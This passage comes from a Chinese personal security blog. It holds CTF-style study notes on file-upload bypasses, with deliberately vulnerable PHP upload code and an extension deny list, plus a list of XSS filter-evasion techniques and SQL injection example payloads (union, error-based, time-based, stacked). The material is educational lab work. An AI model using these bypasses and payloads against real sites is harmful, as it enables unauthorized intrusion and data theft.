class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>竞争上传，多线程上传phpinfo.php.7z到apache上，可利用apache解析漏洞解析php</p>
<h3 id="pass-19-20"><a href="#pass-19-20" class="headerlink" title="pass 19-20"></a>pass 19-20</h3><p>move_uploaded_file() 忽略/.<br>上传phpinfo.php/.  move_uploaded_file生成的新文件变为phpinfo.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//19</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,</span><br><span class="line">        <span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,</span><br><span class="line">        <span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,</span><br><span class="line">        <span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题主要考了两个点，一个是move_uploaded_file忽略/.，另外一个是逻辑漏洞<br>逻辑漏洞主要是在$file_name=reset($file).’/‘.$file[count($file)-1];<br>取file数组的第一个元素和file的最后一个元素形成路径。而count函数的值代表了数组非空元素的个数</p>
<p>代码主要的问题是处在上传save_name为数组时，检查ext时是检测save_name的最后一个元素，现在比较理想的情况是构造一个可以解析的文件后缀<br>大概是xxx.php.xxx, 这就要求了$file[count($file)-1]和end($file)代表了不同的元素，那么传入两个元素save_name[0]=phpinfo.php<br>save_name[2]=.jpg,刚好能满足要求。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//20</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="ck032f9lk000j0n64jij4f10v" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xss学习小结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/12/xss学习小结/" class="article-date">
  <time datetime="2019-06-12T12:46:05.000Z" itemprop="datePublished">2019-06-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/12/xss学习小结/">xss学习小结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;近期做了下有关xss的一些练习，入手了xss的学习，下面结合题目做一下小结</p>
<h2 id="xss的介绍"><a href="#xss的介绍" class="headerlink" title="xss的介绍"></a>xss的介绍</h2><p>&emsp;&emsp;xss即跨站脚本的简称，是一种通过注入html代码，并等待受害者加载页面从而实现恶意目的的一种攻击方式。主要有三种形式，反射型xss,存储型xss以及dom型xss。</p>
<p>&emsp;&emsp;反射型xss和存储型xss最大的区别在于存储型xss的恶意代码将存入数据库，当每一个用户访问被处理后的页面后都会加载恶意代码。而反射型xss则需要用一些手段诱导用户点击带有恶意代码的链接从而达成目的。</p>
<p>&emsp;&emsp;dom型xss是通过修改dom节点而形成的xss，举一个推特的dom型xss为例。</p>
<code>
(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a.replace(/:/gi,"");}})(window);
</code>

<p>代码加载后，window.location会被修改为#!后的值，经过处理后可以引发xss。</p>
<h2 id="xss的一些姿势"><a href="#xss的一些姿势" class="headerlink" title="xss的一些姿势"></a>xss的一些姿势</h2><h3 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h3><ul>
<li>script 标签闭合</li>
<li>通过标签的属性引发 例如img标签的onerror,onfouse,onmousemove等等</li>
<li>javascript 伪协议（其中img的src属性伪协议只能在ie中触发xss）</li>
<li>data协议，base64,url编码等等</li>
<li>iframe标签, body标签等等<h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3></li>
<li>random case 随机大小写</li>
<li>过滤空格，考虑/**/,/等等</li>
<li>html实体编码，包括16进制和10进制的编码&#xx;的形式</li>
<li>js编码包括16进制，8进制，以及unicode 编码</li>
<li>利用string.fromCharCode,/xxx/等可以突破双引号的限制</li>
<li>利用eval和atob函数调用base64编码的代码<h3 id="css注入"><a href="#css注入" class="headerlink" title="css注入"></a>css注入</h3></li>
<li>利用background的url属性</li>
<li>利用expression()调用js代码，这个仅在ie中生效</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;由于七牛云还没有过实名，就先不加案例了，以后一起补。xss在不同的浏览器上姿势是可能不同的，这可能是需要补充的部分。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><ul>
<li><p>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/06/12/xss学习小结/" data-id="ck032f9kr00030n64mhvq5ayk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入初步" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/05/sql注入初步/" class="article-date">
  <time datetime="2019-06-05T00:11:21.000Z" itemprop="datePublished">2019-06-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/05/sql注入初步/">sql注入初步</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是这段时间来学习sql注入的一个小结，想分几篇文章来讨论下sql注入的一些内容和在ctf比赛中的具体实例。</p>
<h2 id="常规sql注入的几个分类"><a href="#常规sql注入的几个分类" class="headerlink" title="常规sql注入的几个分类"></a>常规sql注入的几个分类</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>  联合注入是一种有回显的注入，主要的利用手法是通过union查询结果覆盖合法查询结果以得到数据库中更多内容，常见于搜索框中。类似于 xxx.xxx?id=1’ union select 1,2,3– ，而页面回显包含1，2，3。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>  报错注入也是一种常见的注入方式，主要是利用数据库的某些机制人为地制造出错误条件，使查询结果出现在错误信息中。个人比较常用的主要有两种方式，一种是通过xpath语法错误报错，例如 id=1’ and extractvalue(concat(0x7e,database(),0x7e))–，另外一种是通过几何函数报错（只测试过mysql）id=1’ and ploygon(id)</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>  延时注入主要是在页面无回显或者报错联合以及布尔盲注失效的时候考虑的一种做法，主要有两种思路，一种是构造布尔条件利用数据库特有函数延时，另外一种是通过耗时较长的运算来模拟延时。例如mysql中的benchmark函数。<br>  例如 id=1’ or if(mid(database(),1,1)=’a’,sleep(5),0)– </p>
<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>  布尔注入主要是页面回显受限的时候的一种做法，构造布尔条件，但条件不同时页面回显不同，这说明存在布尔注入<br>  例如 id=1’ or if(mid(database(),1,1)=’a’,1,0)–<br>  如果条件成立页面返回id=1的查询结果，但不成立时页面无回显</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>  堆叠注入我碰到的不是特别多，印象比较深刻的就是强网杯的那道注入题（经验不足，看到select被过滤了还在傻傻地想办法绕过）。主要的问题是允许执行多条sql语句的，例如php的pdo。那么可以将sql截断后附上想要执行的sql语句，在无回显的情况下考虑update或者insert，有回显的情况下考虑使用procedure执行编码后的sql语句来绕过过滤<br>  例如 id=1’;show tables;<br>  回显tables的信息</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h2 id="注入中几个常见的场景"><a href="#注入中几个常见的场景" class="headerlink" title="注入中几个常见的场景"></a>注入中几个常见的场景</h2><h3 id="where-后存在注入"><a href="#where-后存在注入" class="headerlink" title="where 后存在注入"></a>where 后存在注入</h3><p>  多见于查询框，登录表单中，后台语句类似于这样<br>  <code>select * from users where username='$_GET['username']'</code><br>  闭合username后即可利用</p>
<h3 id="insert和update中存在注入"><a href="#insert和update中存在注入" class="headerlink" title="insert和update中存在注入"></a>insert和update中存在注入</h3><p>  举insert为例<br>  <code>insert into users('username','password')values("$_POST['username']","$_POST['password']");<br>  闭合""和）后构造语句即可利用<br>  </code></p>
<h3 id="limit后存在注入"><a href="#limit后存在注入" class="headerlink" title="limit后存在注入"></a>limit后存在注入</h3><p>  <code>select * from users where id=1 limit 1,$_GET['max']</code><br>  补齐limit后对应数量，然后可以采用produre analyse()来进行延时注入或者报错注入</p>
<h2 id="常见的一些思路"><a href="#常见的一些思路" class="headerlink" title="常见的一些思路"></a>常见的一些思路</h2><h3 id="常见的一些保护手段"><a href="#常见的一些保护手段" class="headerlink" title="常见的一些保护手段"></a>常见的一些保护手段</h3><p>  对于数字型参数的保护是用intval()函数转为数字，对于字符型参数的保护主要使用addslash()函数，但这种保护需要注意mysql的连接的编码和网页的编码需要保持一致，不然可能产生宽字节注入的危险。碰到waf的时候根据情况处理即可，碰到常规注入都行不通的情况考虑堆叠注入。</p>
<h3 id="测试的思路"><a href="#测试的思路" class="headerlink" title="测试的思路"></a>测试的思路</h3><p>  首先上来拿到题目最好先拿源码泄露脚本扫描一遍，看看能不能拿到源码。右键看下源码，能看的东西都看一遍。然后寻找可控制的参数，做一下fuzz。首先考虑闭合语句，再优先考虑报错注入和联合注入，都不可行的情况下考虑盲注，最后可以尝试宽字节注入和堆叠注入。主要常见的闭合语句就是‘和‘），’))几种，都试一试。语句正确的情况下考虑and和or被过滤的情况，建议替换为||和&amp;&amp;。对于空格的过滤可以考虑替换为/**/和%a0。如果存在关键词的黑名单，考虑随机大小写关键词和双写绕过，也可以考虑一些特殊的符号比如1e0，Emoj等等来截断。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这是本人的第一篇博客，写的比较水，后续打算写几篇最近做题的wp或者更具体的一些分析，比如报错注入的一些点就可以好好讲讲。近期还是优先准备4，6级考试。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="ck032f9kt00040n64idi5vhh8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/500lines/">500lines</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe注入/">xxe注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/500lines/" style="font-size: 10px;">500lines</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe注入/" style="font-size: 10px;">xxe注入</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/09/02/shell编程基础/">shell编程基础</a>
          </li>
        
          <li>
            <a href="/2019/08/20/简易python模板引擎其一/">简易python模板引擎其一</a>
          </li>
        
          <li>
            <a href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
          </li>
        
          <li>
            <a href="/2019/06/24/文件上传漏洞/">文件上传漏洞</a>
          </li>
        
          <li>
            <a href="/2019/06/12/xss学习小结/">xss学习小结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 star<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>